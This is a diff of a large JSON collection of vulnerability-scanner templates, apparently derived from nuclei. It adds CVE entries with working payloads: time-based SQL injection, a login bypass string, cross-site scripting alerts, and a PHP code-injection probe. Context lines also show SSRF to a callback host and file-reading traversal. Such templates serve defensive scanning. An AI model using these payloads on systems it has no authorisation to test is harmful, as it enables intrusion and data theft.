@@ -10364,8 +10364,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -11854,6 +11854,20 @@
       ]
     },
     {
+      "id": "CVE-2020-21012",
+      "info": {
+        "name": "Sourcecodester Hotel and Lodge Management System 2.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /forgot_password.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbtn_forgot=1&email=1%27%20or%20sleep(6)%23\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-2103",
       "info": {
         "name": "Diagnostic page exposed session cookies",
@@ -12176,6 +12190,36 @@
       ]
     },
     {
+      "id": "CVE-2020-24902",
+      "info": {
+        "name": "Quixplorer <=2.4.1 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?action=post&order=bszop%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-24903",
+      "info": {
+        "name": "Cute Editor for ASP.NET 6.4 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/CuteSoft_Client/CuteEditor/Template.aspx?Referrer=XSS\";><script>alert(document.domain)</script>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-24912",
       "info": {
         "name": "QCube Cross-Site-Scripting",
@@ -12324,9 +12368,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -12677,6 +12721,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?page=/etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-29284",
+      "info": {
+        "name": "Multi Restaurant Table Reservation System 1.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/dashboard/view-chair-list.php?table_id='+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-"
           ]
         }
       ]
@@ -18576,6 +18635,21 @@
       ]
     },
     {
+      "id": "CVE-2021-43510",
+      "info": {
+        "name": "Simple Client Management System 1.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /classes/Login.php?f=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+or+'1'%3d'1'--+-&password=as\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-43574",
       "info": {
         "name": "Atmail 6.5.0 - Cross-Site Scripting",
@@ -18719,14 +18793,15 @@
     {
       "id": "CVE-2021-44451",
       "info": {
-        "name": "Apache Superset Default Login",
+        "name": "Apache Superset - Default Login",
         "severity": "medium"
       },
       "requests": [
         {
           "raw": [
-            "GET /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
-            "POST /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/admin/airflow/login\n\ncsrf_token={{csrf_token}}&username={{username}}&password={{password}}\n"
+            "GET /login/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /login/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ncsrf_token={{csrf_token}}&username={{username}}&password={{password}}\n",
+            "GET /dashboard/list/ HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -19349,6 +19424,20 @@
           "path": [
             "{{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp",
             "{{BaseURL}}/?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(\"CVE-2022-0346\");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0349",
+      "info": {
+        "name": "NotificationX WordPress plugin < 2.3.9 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nPOST /?rest_route=/notificationx/v1/analytics HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnx_id=sleep(6) -- x\n"
           ]
         }
       ]
@@ -22397,6 +22486,21 @@
       ]
     },
     {
+      "id": "CVE-2022-3484",
+      "info": {
+        "name": "WPB Show Core - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-35151",
       "info": {
         "name": "kkFileView 4.1.0 - Cross-Site Scripting",
@@ -22486,6 +22590,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/home/get_products?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-3578",
+      "info": {
+        "name": "ProfileGrid < 5.1.1 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php?page=pm_add_group&id=\"><script>alert%28document.domain%29<%2Fscript> HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
